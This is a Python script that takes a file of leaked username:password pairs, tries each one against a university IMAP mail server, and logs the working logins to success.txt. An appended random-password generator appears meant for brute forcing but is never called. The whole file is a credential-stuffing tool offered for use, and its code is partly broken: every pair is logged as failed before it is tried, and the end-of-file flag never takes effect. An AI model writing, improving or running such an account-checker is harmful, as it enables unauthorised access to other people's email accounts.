# version 3.4.0
# coding='UTF-8'
# time='2014-09-16'
import _dummy_thread
import imaplib
import threading
 
# global variant 
GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY = []
GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY_NUM = 0
GLOBAL_STRING_GMAIL_IMAP4_SERVER = 'imap.swu.edu.cn'
GLOBAL_INT_GMAIL_IMAP4_SERVER_PORT = 143
GLOBAL_INT_GMAIL_IMAP4_SSL_PORT = 993
GLOBAL_WORKING_THREAD_MUTEX_LOCK = _dummy_thread.allocate_lock()
GLOBAL_ARRAY_BUFFER_MAX_LINES = 1000
GMAIL_BYTES_READED_TOTAL_SIZE = 0
GLOBAL_GMAIL_CURRENT_POSITION_TOTAL_LINES = 0
GLOBAL_READ_FINISH_STATUS_SUCCESS = False
# define global function
 
def Write_Save_Success_Gmail_Jobs(indexSuccess): 
        Success_File = open('success.txt', 'a')
        Success_File.write(GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY[indexSuccess])
        Success_File.close()
 
def Write_Save_Fail_Gmail_Jobs(indexFail): 
        Fail_File = open('fail.txt', 'a')
        Fail_File.write(GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY[indexFail])       
        Fail_File.close()
# define global function
 
def Get_Parser_Account_Pwd(Index):
    strAccountPwd = GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY[Index]
    strUserName, strPassWord = strAccountPwd.split(':', 1)
    return strUserName, strPassWord
 
# define global function
def Veritifying_Gmail_Imap_Account_Pwd(IndexGmail):
    global GLOBAL_WORKING_THREAD_MUTEX_LOCK
    global GLOBAL_GMAIL_CURRENT_POSITION_TOTAL_LINES
    if ((IndexGmail >= 0) and (IndexGmail < GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY_NUM)) == True:
        GLOBAL_WORKING_THREAD_MUTEX_LOCK.acquire()
        GLOBAL_GMAIL_CURRENT_POSITION_TOTAL_LINES += 1
        print('POSITION---------', GLOBAL_GMAIL_CURRENT_POSITION_TOTAL_LINES)
        print('IMAP INDEX-------', IndexGmail)
        print('IMAP USERNAME----', GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY[IndexGmail])
        Write_Save_Fail_Gmail_Jobs(IndexGmail) 
        # GLOBAL_WORKING_THREAD_MUTEX_LOCK.release()
        print(GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY[IndexGmail])
        GmailImap4 = imaplib.IMAP4_SSL(GLOBAL_STRING_GMAIL_IMAP4_SERVER, GLOBAL_INT_GMAIL_IMAP4_SSL_PORT)
        GmailImap4.port = GLOBAL_INT_GMAIL_IMAP4_SERVER_PORT  # 143
        stringGmailUserName, stringGmailPassWord = Get_Parser_Account_Pwd(IndexGmail)
        try:
            ResponseStatus = GmailImap4.login(stringGmailUserName, stringGmailPassWord)
        except GmailImap4.error :     
            print('Logical errors - debug required')
            Write_Save_Fail_Gmail_Jobs(IndexGmail)     
            GLOBAL_WORKING_THREAD_MUTEX_LOCK.release()
            return
        except GmailImap4.abort :
            print('Service errors - close and retry')
            GmailImap4.close()
            Write_Save_Fail_Gmail_Jobs(IndexGmail)     
            GLOBAL_WORKING_THREAD_MUTEX_LOCK.release()
            return
        except GmailImap4.readonly:
            print('Mailbox status changed to read only')
            GmailImap4.close()
            Write_Save_Fail_Gmail_Jobs(IndexGmail)     
            GLOBAL_WORKING_THREAD_MUTEX_LOCK.release()
            return
        if (ResponseStatus[0] == 'OK'):
            print('LOGIN SUCCESS')
            Write_Save_Success_Gmail_Jobs(IndexGmail)
            GmailImap4.logout()   
            GLOBAL_WORKING_THREAD_MUTEX_LOCK.release()
        else:
            GmailImap4.close()
            print('LOGIN FAIL')
            print(ResponseStatus)
            Write_Save_Fail_Gmail_Jobs(IndexGmail)     
            GLOBAL_WORKING_THREAD_MUTEX_LOCK.release()
    else:
        return
# define global function 
 
    
class Working_Zone_Thread(threading.Thread):  
    m_IndexStart = 0
    m_IndexEnd = 0
    def __init__(self, numEnd):        
        self.m_IndexEnd = numEnd
        threading.Thread.__init__(self)  
    def run(self):  # run process
        while  True:
            if self.m_IndexStart < self.m_IndexEnd: 
                Veritifying_Gmail_Imap_Account_Pwd(self.m_IndexStart)      
                self.m_IndexStart = self.m_IndexStart + 1            
            else:
                break
    def _delete(self):
        threading.Thread._delete(self)
        print('thread delete is : ', self.getName())
 
# define read function
def Read_Send_Single_Func(): 
    IndexStart = 0
    print('--------read----star--')
    global GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY_NUM
    global GMAIL_BYTES_READED_TOTAL_SIZE
    global GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY
    File_Read = open('mail.txt', 'r', encoding='UTF-8')
    File_Read.seek(GMAIL_BYTES_READED_TOTAL_SIZE, 0)  # seek
    while IndexStart < GLOBAL_ARRAY_BUFFER_MAX_LINES:
        line = File_Read.readline()
        if line:
            GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY.append(line)
            CbBytes = line.__len__()
            GMAIL_BYTES_READED_TOTAL_SIZE += CbBytes
            GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY_NUM += 1
            IndexStart = IndexStart + 1    
        else:
            GLOBAL_READ_FINISH_STATUS_SUCCESS = True
            break
    print('mail read num ', IndexStart)
    File_Read.close()
    print('---------read----end--')

import random
import time
import sys
 
 
class MyIterator():
    # 单位字符集合
    letters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    min_digits = 0
    max_digits = 0
 
    def __init__(self, min_digits, max_digits):
        # 实例化对象时给出密码位数范围，一般4到10位
        if min_digits < max_digits:
            self.min_digits = min_digits
            self.max_digits = max_digits
        else:
            self.min_digits = max_digits
            self.max_digits = min_digits
 
    # 迭代器访问定义
    def __iter__(self):
        return self
 
    def __next__(self):
        rst = str()
        for item in range(0, random.randrange(self.min_digits, self.max_digits+1)):
            rst += random.choice(MyIterator.letters)
        return rst

 
# main entry
if __name__ == '__main__':
    print('Main Thread Start : ')
    while True:
        if GLOBAL_READ_FINISH_STATUS_SUCCESS != True:
            Read_Send_Single_Func()
            wzt = Working_Zone_Thread(GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY_NUM)
            wzt.start()
            wzt.join()
            GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY_NUM = 0
            GLOBAL_STRING_GMAIL_ACCOUNT_PWD_ARRAY.clear()
        else:
            print('data has run out : ')
            break
    print('Main Thread End : ')